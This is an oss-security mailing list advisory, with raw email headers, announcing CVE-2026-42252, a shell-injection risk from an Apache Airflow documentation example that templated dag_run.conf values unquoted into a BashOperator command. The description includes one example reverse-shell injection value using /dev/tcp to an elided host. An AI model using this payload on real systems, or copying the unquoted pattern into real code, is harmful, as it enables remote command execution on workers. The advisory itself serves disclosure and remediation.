Received: (qmail 25886 invoked by uid 550); 31 May 2026 11:53:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 26574 invoked from network); 31 May 2026 11:51:47 -0000
Authentication-Results: apache.org; auth=none
Content-Type: text/plain; charset=utf-8
From: Rahul Vats <rahulvats@apache.org>
To: oss-security@lists.openwall.com
Message-ID: <2c201f37-5e84-824f-17aa-028d1e08dfe0@apache.org>
Content-Transfer-Encoding: quoted-printable
Date: Sun, 31 May 2026 11:50:40 +0000
MIME-Version: 1.0
Subject: [oss-security] =?UTF-8?Q?CVE-2026-42252=3A_Apache_Airflow=3A_Bash?=
 =?UTF-8?Q?Operator_Jinja2_injection_via_dag=5Frun?=
 =?UTF-8?Q?=2Econf_=E2=80=94_low-privilege_user_pat?= =?UTF-8?Q?tern=20?=

Severity: low=20

Affected versions:

- Apache Airflow (apache-airflow) 3.0.0 before 3.2.2

Description:

Apache Airflow's official documentation at `core-concepts/dag-run.html` ("P=
assing Parameters when triggering Dags") showed a verbatim `BashOperator(ba=
sh_command=3D"echo value: {{ dag_run.conf['conf1'] }}")` example without an=
y quoting / sanitization warning. Dag authors who copied the pattern verbat=
im into deployments where users had `Dag.can_trigger` permission on the aff=
ected Dag (typical multi-team deployments, hosted offerings exposing a trig=
ger API) could be exposed to shell-metacharacter injection via the `conf` f=
ield of the trigger API: an authenticated trigger user could supply `"; bas=
h -i >& /dev/tcp/.../9999 0>&1; #"` as a `conf` value and reach an `os.exec=
` on the worker. This CVE covers the documentation correction in `apache/ai=
rflow` PR 64129 =E2=80=94 the pattern in the docs example now includes expl=
icit shell-quoting and a safety caveat. Affects deployments whose Dag code =
was modeled on the pre-correction docs example. Same class as the prior CVE=
-2025-50213 and CVE-2025-27018 documentation-pattern fixes. Users are advis=
ed to upgrade to `apache-airflow` 3.2.2 or later to pick up the corrected d=
ocumentation shipped with the release.

Credit:

anonymous (finder)
Kevin Yang (sjyangkevin) (remediation developer)

References:

https://github.com/apache/airflow/pull/64129
https://airflow.apache.org/
https://www.cve.org/CVERecord?id=3DCVE-2026-42252

